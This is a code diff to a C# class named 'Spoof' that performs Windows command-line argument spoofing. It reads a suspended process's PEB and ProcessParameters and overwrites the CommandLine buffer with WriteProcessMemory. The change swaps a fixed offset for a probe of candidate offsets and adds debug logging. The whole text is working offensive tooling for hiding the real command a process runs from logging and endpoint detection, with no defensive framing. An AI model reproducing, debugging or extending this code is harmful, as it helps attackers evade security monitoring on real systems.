@@ -135,8 +135,7 @@ public static class Spoof
         OSVERSIONINFOEXW osvi = new OSVERSIONINFOEXW();
         osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(osvi);
         RtlGetVersion(ref osvi);
-        int commandLineOffset = osvi.dwBuildNumber >= 22621 ? 0x80 : CommandLineOffsetFallback;
-        Log("[+] OS build " + osvi.dwBuildNumber + " → CommandLineOffset = 0x" + commandLineOffset.ToString("x"));
+        Log("[+] OS build " + osvi.dwBuildNumber);
 
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
@@ -165,7 +164,7 @@ public static class Spoof
             CloseHandle(pi.hThread);
             return;
         }
-        Log("[+] PEB located");
+        Log("[+] PEB located at 0x" + pbi.PebBaseAddress.ToString("X"));
 
         byte[] pebBuffer = new byte[IntPtr.Size * 4];
         int bytesRead;
@@ -177,10 +176,53 @@ public static class Spoof
             CloseHandle(pi.hThread);
             return;
         }
-        Log("[+] PEB read");
+        Log("[+] PEB read (" + bytesRead + " bytes)");
 
         int ppOffset = IntPtr.Size == 8 ? 0x20 : 0x10;
         IntPtr processParametersPtr = Marshal.ReadIntPtr(pebBuffer, ppOffset);
+        Log("[+] ProcessParameters at 0x" + processParametersPtr.ToString("X"));
+
+        int[] offsetsToTry = { 0x70, 0x78, 0x80, 0x88 };
+        int commandLineOffset = -1;
+        
+        foreach (int offset in offsetsToTry)
+        {
+            byte[] testBuffer = new byte[16];
+            bool readOk = ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, offset), testBuffer, testBuffer.Length, out bytesRead);
+            
+            if (readOk)
+            {
+                ushort length = BitConverter.ToUInt16(testBuffer, 0);
+                ushort maxLength = BitConverter.ToUInt16(testBuffer, 2);
+                IntPtr bufferPtr = IntPtr.Size == 8 ? 
+                    (IntPtr)BitConverter.ToInt64(testBuffer, 8) : 
+                    (IntPtr)BitConverter.ToInt32(testBuffer, 8);
+                
+                string bytesHex = BitConverter.ToString(testBuffer).Replace("-", " ");
+                Log($"[DEBUG] Offset 0x{offset:X}: Read=OK, Length={length}, MaxLength={maxLength}, Buffer=0x{bufferPtr:X}");
+                Log($"[DEBUG]   Bytes: {bytesHex}");
+                
+                if (length > 0 && maxLength >= length && bufferPtr != IntPtr.Zero)
+                {
+                    commandLineOffset = offset;
+                    Log($"[+] Found valid CommandLine at offset 0x{offset:X}");
+                    break;
+                }
+            }
+            else
+            {
+                Log($"[DEBUG] Offset 0x{offset:X}: Read=FAILED");
+            }
+        }
+
+        if (commandLineOffset == -1)
+        {
+            Log("[-] Could not find valid CommandLine offset");
+            ResumeThread(pi.hThread);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return;
+        }
 
         byte[] cmdBuffer = new byte[16];
         if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, commandLineOffset), cmdBuffer, cmdBuffer.Length, out bytesRead))
@@ -194,10 +236,10 @@ public static class Spoof
         Log("[+] Command line pointer read");
 
         byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
-        IntPtr bufferPtr = Marshal.ReadIntPtr(cmdBuffer, 8);
+        IntPtr bufferPtr2 = Marshal.ReadIntPtr(cmdBuffer, 8);
 
         int written;
-        if (!WriteProcessMemory(pi.hProcess, bufferPtr, newCmdBytes, newCmdBytes.Length, out written))
+        if (!WriteProcessMemory(pi.hProcess, bufferPtr2, newCmdBytes, newCmdBytes.Length, out written))
         {
             Log("[-] WriteProcessMemory(cmd) FAILED");
             ResumeThread(pi.hThread);
